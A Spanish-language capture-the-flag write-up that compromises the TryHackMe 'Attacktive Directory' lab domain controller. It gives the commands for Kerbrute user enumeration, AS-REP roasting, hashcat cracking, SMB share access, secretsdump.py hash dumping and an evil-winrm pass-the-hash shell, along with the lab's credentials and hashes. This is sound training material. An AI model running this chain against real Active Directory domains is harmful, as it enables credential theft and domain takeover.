# Sala virtual Attacktive Directory
El 99% de las redes corporativas funcionan con AD. Pero, ¿Puedes explotar un Domain Controller vulnerable?

## Conceptos previos
#### ¿Qué es Impacket?

Impacket es una colección de clases de Python para trabajar con protocolos de red. Impacket se centra en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implementación del protocolo en sí.
## Programas necesarios

### Impacket
#### Instalación

Ejecutar los siguientes comandos:
~~~
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
sudo cd /opt/impacket/
sudo pip3 install .
sudo python3 setup.py install
~~~

### Kerbrute
#### Instalación
Ejecutar los siguientes comandos:
~~~
sudo git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build .
~~~

# Comenzamos!!!
Para mí la IP de la máquina virtual que esta en mi red es 10.10.44.155. A ustedes les puede dar una IP distinta así que recuerde cambiarla al momento de realizar los pasos.
## 1. Fase de Descubrimiento
Verificamos si tenemos traza ICMP con la máquina virtual con el siguiente comando.

    ping -c 1 10.10.44.155

![img1](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img1.png)

Si podemos enviar paquetes además como el ttl es 127 podemos decir que se trata de una máquina Windows.

Para un escano rapido y centrado en el Active Directory podemos usar la herramienta **enum4linux**.

![img2](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img2.png)

Para un escaneo más exhaustivo utilizaremos la herramienta **Nmap**.

    nmap -p- --open -T5 -v -n 10.10.44.155

![img3](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img3.png)

Luego lanzaremos una serie de scrips básicos de enumeración sobre los puertos abiertos con **Nmap**.

    nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49675,49676,49679,49684,49696 10.10.44.155

~~~
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 21:57 -05
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 21:58 (0:00:08 remaining)
Nmap scan report for 10.10.44.155
Host is up (0.20s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-04-23 02:57:57Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-23T02:58:51+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-04-22T02:19:39
|_Not valid after:  2021-10-22T02:19:39
|_ssl-date: 2021-04-23T02:58:58+00:00; -1s from scanner time.
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49667/tcp closed unknown
49669/tcp closed unknown
49672/tcp open   msrpc         Microsoft Windows RPC
49675/tcp closed unknown
49676/tcp open   msrpc         Microsoft Windows RPC
49679/tcp closed unknown
49684/tcp closed unknown
49696/tcp closed unknown
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-04-23T02:58:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.46 seconds
~~~

Nos fijamos en el puerto 3389 que nos muestra el NetBIOS_Domain_Name y el TLD.

Ahora con la [lista de usuarios](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) potenciales del DC que nos dio la pagina y la herramienta **Kerbrute** podemos enumerar los usarios validos del Dominio.

![img4](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img4.png)

Para ello ejecutaremos el siguiente comando dentro de la carpeta de Kerbrute.

    ./kerbrute userenum --dc 10.10.44.155 -d spookysec.local userlist.txt

![img5](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img5.png)

Como atacantes de la lista de usuarios validos nos llaman la atención dos usuarios: svc-admin y backup

Genial! Ahora que conocemos que usuarios son validos podemos usar la herramienta **GetNPUsers.py** para saber que usuarios no requieren de autenticacion previa. La autenticación previa es el primer paso en la autenticación Kerberos y está diseñada para evitar ataques de adivinación de contraseñas por fuerza bruta.

    GetNPUsers.py spookysec.local/ -no-pass -dc-ip 10.10.44.155 -usersfile userlist.txt | grep -v "Error"

![img6](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img6.png)

El usuario svc-admin es ASReproastable ya que no tiene autenticacion previa. Ademas nos devolvio un hash al final.

    $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e404ff17a71f192d95fb1506d4089ddc$0a64bc24ba61e1a50d421f4d4d7c1c5158d654af9e2a6d81ade67097e5b72cf570543c0f819b3de1ed2b6cda3527f27e8fc89500e13ee0ce6fe78c7915e8dc223e1cfce82109db6a5b8690b29dfae5f3766bd569a674c06eb8e70b927bb333d4f8b211eba17c7922341450d429e46f51e3f0b9d861ff67a2c8f1a246a8cef59745594cfbdfaf01d6f4912212c09d4e5ebbc1c3db4023f66213e9f580b1a0a14e81d34caa6e399d3f37d551daed59bb555cddbc1844acb234e1c68a169089013af135e17badd1a90c36dfb5dcf27a6c23446f56a8a032191ce8ed2dfbe2f36cb7ff7924ce09ff3f963c1cb201d527088b49b1

## 2. Fase de Ataque

Haciendo uso de la herramienta **hashcat** vamos a crackear el hash que obtuvimos pero antes debemos saber que tipo de hash es para ello hashcat nos da varios ejemplos con la opción --example-hashes.

    hashcat --example-hashes | grep "krb5asr" -B 3

![img7](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img7.png)

Ahora que sabemos que es un hash de tipo Kerberos 5 AS-REP etype 23 modo 18200 ya podremos romperlo con hashcat usando la [lista de contraseñas](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) que nos da la pagina.

    hashcat -m 18200 -a 0 hash passwordlist.txt

Donde -m indica el modo, con -a indicamos el modo de ataque, el hash que mostramos anteriormente esta en un archivo llamado hash y passwordlist.txt es el archivo que contiene todas las contraseñas potenciales que nos dio la página.

Para mostrar el resultado usaremos el comando:

    hashcat -m 18200 -a 0 hash passwordlist.txt --show

![img8](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img8.png)

## 3. Escalada de privilegios

Ahora que tenemos credenciales validas con la herramienta **rpclient** podemos listar los usuarios y grupos del dominio.

![img9](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img9.png)

Luego con los **rid** de cada usuario ver cuales pertenecen al grupo de administradores del dominio.

![img10](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img10.png)

Ademas del usuario admin, el usuario a-spooks también pertece al grupo de administradores del dominio ahora que sabemos trataremos de conseguir las credenciales de eso usuario de alguna forma.

También con las credenciales de svc-admin podemos listar los recursos compartidos del AD con el comando **smbclient** y el parametro **-L**.

    smbclient -L 10.10.44.155 -U 'svc-admin%management2005'

![img11](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img11.png)

Dentro de los recursos compartidos hay un recurso que nos llama mucho la atencion: **backup**. Veamo que hay dentro para eso nos conectamos con el siguiente comando.

    smbclient //10.10.44.155/backup -U 'svc-admin%management2005'

![img12](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img12.png)

Al parecer nos encontramos las credenciales del usuario backup, vamos a descargarlo a nuestra maquina del recurso compartirlo para poder leerlo.

![img13](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img13.png)

Es un texto en base64 si lo decodificamos nos da lo siguiente:

    backup@spookysec.local:backup2517860#

Ya tenemos credenciales de otro usuario.

Impacket también nos proporciona la herramienta **secretsdump.py** que nos sirve para dumpear los hashes NTLM de los usuarios del AD usando el metodo DRSUAPI.

    secretsdump.py spookysec.local/backup:backup2517860@10.10.44.155

![img14](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img14.png)

Conseguimos varios hashes NTLM incluido el del usuario a-spooks. Con estos hashes podemos hacer un ataque de tipo Pass the Hash.

Una vez tenemos el hash NTLM del usuaro a-spooks quien es administrador del dominio entonces podemos abrirnos una shell con **evil-winrm**.

    evil-winrm -i 10.10.44.155 -u a-spooks -H 0e0363213e37b94221497260b0bcb4fc

![img15](https://github.com/Hiteek/TryHackMe/blob/master/AttacktiveDirectory/img/img15.png)

Ahora solo quedaria buscar las flags en los siguientes directorios.

    C:\Users\Administrator\Desktop
    C:\Users\backup\Desktop
    C:\Users\a-spooks\Desktop
